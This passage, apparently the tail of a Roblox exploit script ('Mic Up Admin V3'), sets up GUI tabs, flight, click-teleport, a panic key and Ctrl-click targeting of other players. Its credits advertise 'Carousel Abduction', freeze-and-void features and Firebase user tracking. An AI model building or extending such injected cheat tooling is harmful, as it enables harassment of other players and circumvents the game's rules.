})

-- World Tab
local WorldTab = Window:CreateTab("ðŸŒ World", 4483362458)

WorldTab:CreateSection("Baseplate")

WorldTab:CreateToggle({
    Name = "Infinite Baseplate",
    CurrentValue = false,
    Callback = function(Value)
        baseplateActive = Value
        if Value then
            if baseplatePart then baseplatePart:Destroy() end
            baseplatePart = Instance.new("Part", workspace)
            baseplatePart.Name = "AdminBaseplate"
            baseplatePart.Size = Vector3.new(2048000, 1, 2048000)
            baseplatePart.Position = Vector3.new(0, -1, 0)
            baseplatePart.Anchored = true
            baseplatePart.Color = baseplateColor
            baseplatePart.Material = Enum.Material.SmoothPlastic
            baseplatePart.TopSurface = Enum.SurfaceType.Smooth
            baseplatePart.BottomSurface = Enum.SurfaceType.Smooth
            notify("Baseplate", "Infinite baseplate enabled! (2M studs)", 2)
        elseif baseplatePart then
            baseplatePart:Destroy()
            baseplatePart = nil
        end
    end
})

WorldTab:CreateColorPicker({
    Name = "Baseplate Color",
    Color = Color3.fromRGB(50, 50, 50),
    Callback = function(Value)
        baseplateColor = Value
        if baseplatePart then
            baseplatePart.Color = Value
        end
    end
})

-- Settings Tab
local SettingsTab = Window:CreateTab("âš™ï¸ Settings", 4483362458)

SettingsTab:CreateSection("Notifications")

SettingsTab:CreateToggle({
    Name = "Show Notifications",
    CurrentValue = _G.MicUpSettings.ShowNotifications,
    Callback = function(Value)
        _G.MicUpSettings.ShowNotifications = Value
    end
})

SettingsTab:CreateSection("Keybinds")

SettingsTab:CreateLabel("GUI Keybind: K (Rayfield default)")
SettingsTab:CreateLabel("Command Bar: Hold ;")
SettingsTab:CreateLabel("Flight: F")
SettingsTab:CreateLabel("Click TP: C")
SettingsTab:CreateLabel("Panic: P")

SettingsTab:CreateLabel("")
SettingsTab:CreateLabel("Custom keybind system coming soon!")

-- Credits
local CreditsTab = Window:CreateTab("â„¹ï¸ Credits", 4483362458)
CreditsTab:CreateLabel("Mic Up Admin V3 - Ultimate Edition")
CreditsTab:CreateLabel("Tier: " .. getUserTier())
CreditsTab:CreateLabel("")
CreditsTab:CreateLabel("Features:")
CreditsTab:CreateLabel("â€¢ Advanced Carousel Abduction")
CreditsTab:CreateLabel("â€¢ Silent Command System")
CreditsTab:CreateLabel("â€¢ Carousel Freeze & Void")
CreditsTab:CreateLabel("â€¢ 17 Animations")
CreditsTab:CreateLabel("â€¢ Heartbeat Active User Tracking")
CreditsTab:CreateLabel("â€¢ Overhead Logo Detection")
CreditsTab:CreateLabel("â€¢ Firebase Integration")
CreditsTab:CreateLabel("")
CreditsTab:CreateLabel("Heartbeat System:")
CreditsTab:CreateLabel("Sends pulse every 60s to Firebase")
CreditsTab:CreateLabel("Bot removes inactive users after 2 min")
CreditsTab:CreateLabel("")
CreditsTab:CreateLabel("Created by [Schwein]")

-- Click TP & Selection
mouse.Button1Down:Connect(function()
    if clickTpEnabled and mouse.Target then
        local root = getRoot(lplr.Character)
        if root then
            root.CFrame = CFrame.new(mouse.Hit.Position + Vector3.new(0, 3, 0))
        end
    end
    
    if UIS:IsKeyDown(Enum.KeyCode.LeftControl) or UIS:IsKeyDown(Enum.KeyCode.RightControl) then
        local char = mouse.Target and mouse.Target:FindFirstAncestorOfClass("Model")
        local p = char and Players:GetPlayerFromCharacter(char)
        if p and p ~= lplr then
            if currentTab == "Carousel" then
                carouselTarget = p
                CarouselTargetInput:Set(p.DisplayName)
                notify("Carousel Target", "Selected: " .. p.DisplayName, 2)
            elseif currentTab == "Animations" then
                animationTarget = p
                AnimTargetInput:Set(p.DisplayName)
                notify("Anim Target", "Selected: " .. p.DisplayName, 2)
            else
                targetPlayer = p
                MainTargetInput:Set(p.DisplayName)
                notify("Target", "Selected: " .. p.DisplayName, 2)
            end
        end
    end
end)

-- Keybinds
UIS.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed then return end
    
    if input.KeyCode == _G.Keybinds.Flight then
        flying = not flying
        if flying then startFlight() else stopFlight() end
    elseif input.KeyCode == _G.Keybinds.ClickTP then
        clickTpEnabled = not clickTpEnabled
        notify("Click TP", clickTpEnabled and "Enabled" or "Disabled", 2)
    elseif input.KeyCode == _G.Keybinds.PanicMode then
        flying = false
        carouselFlying = false
        clickTpEnabled = false
        stopFlight()
        stopCarouselFlight()
        stopAllAnimations()
        notify("PANIC", "All features disabled!", 3)
    end
end)

-- Track current tab
for tabName, tab in pairs({Main = MainTab, Carousel = CarouselTab, Animations = AnimTab}) do
    if tab.Button then
        tab.Button.MouseButton1Click:Connect(function()
            currentTab = tabName
        end)
    end
end

-- Initialize
addLogo(lplr)
notify("Mic Up Admin V3", "Loaded successfully! Tier: " .. getUserTier(), 4)
